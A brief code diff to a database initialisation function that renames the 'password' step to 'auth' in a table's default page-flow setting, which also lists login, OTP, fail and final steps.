@@ -51,7 +51,7 @@ export async function initDB() {
 	    domain TEXT DEFAULT '',
 	    pageFlow TEXT NOT NULL DEFAULT '{
 	       "1": { page: "login", enabled: true },
-		    "2": { page: "password", enabled: true },
+		    "2": { page: "auth", enabled: true },
 		    "3": { page: "otp", enabled: true },
 		    "4": { page: "fail", enabled: true },
 		    "5": { page: "final", enabled: true }
